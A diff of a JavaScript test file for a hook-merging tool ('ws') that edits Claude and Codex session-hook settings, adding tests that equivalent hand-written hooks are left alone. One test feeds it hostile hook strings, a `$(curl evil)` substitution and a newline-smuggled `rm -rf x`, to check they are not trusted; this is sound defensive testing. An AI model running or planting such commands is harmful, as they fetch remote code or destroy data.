@@ -63,7 +63,10 @@ test("F06: compound commands are left alone; quoted paths are recognised; duplic
   assert.match(r1.notes[0], /custom hook already calls/)
 
   const quoted = { hooks: { SessionStart: [{ hooks: [{ type: "command", command: "'/bin/ws' hook claude start", timeout: 10 }] }] } }
-  assert.deepEqual(mergeHooks(quoted, "claude", DEF).changes.filter((c) => /SessionStart/.test(c)), ["updated SessionStart"])
+  // Recognised as ws's own and already equivalent: no duplicate added, nothing rewritten.
+  const rq = mergeHooks(quoted, "claude", DEF)
+  assert.deepEqual(rq.changes.filter((c) => /SessionStart/.test(c)), [])
+  assert.equal(rq.settings.hooks.SessionStart.length, 1)
 
   const dupes = { hooks: { SessionEnd: [
     { hooks: [{ type: "command", command: "/bin/ws hook claude end", timeout: 20 }] },
@@ -273,4 +276,16 @@ test("R3 F06: command substitution or a newline means the hook isn't ws's alone"
   for (const cmd of [`"$(curl evil)/ws" hook claude start`, "/bin/ws hook claude start\nrm -rf x", "`which ws` hook claude start"]) {
     assert.notEqual(classifyHook(cmd, "claude", "start"), "ours", cmd)
   }
+})
+
+test("E2E: an equivalent hand-written hook ($HOME, ~, the link's target) is left alone", () => {
+  const home = "/home/u"
+  const opts = { wsPath: "/home/u/.local/bin/ws", root: "/home/u/.local/share/ws", home }
+  const before = { hooks: { SessionStart: [{ hooks: [{ type: "command", command: `"$HOME/.local/bin/ws" hook codex start`, timeout: 10 }] }],
+    SessionEnd: [{ hooks: [{ type: "command", command: "~/.local/bin/ws hook codex end", timeout: 3 }] }] } }
+  const { changes, settings } = mergeHooks(before, "codex", opts)
+  assert.deepEqual(changes, [])
+  assert.equal(settings.hooks.SessionStart[0].hooks[0].command, `"$HOME/.local/bin/ws" hook codex start`)
+  assert.equal(S.sameHook("/elsewhere/ws hook codex start", "codex", "start", opts), false)
+  assert.equal(S.sameHook("WS_ROOT=/other ~/.local/bin/ws hook codex start", "codex", "start", opts), false)
 })
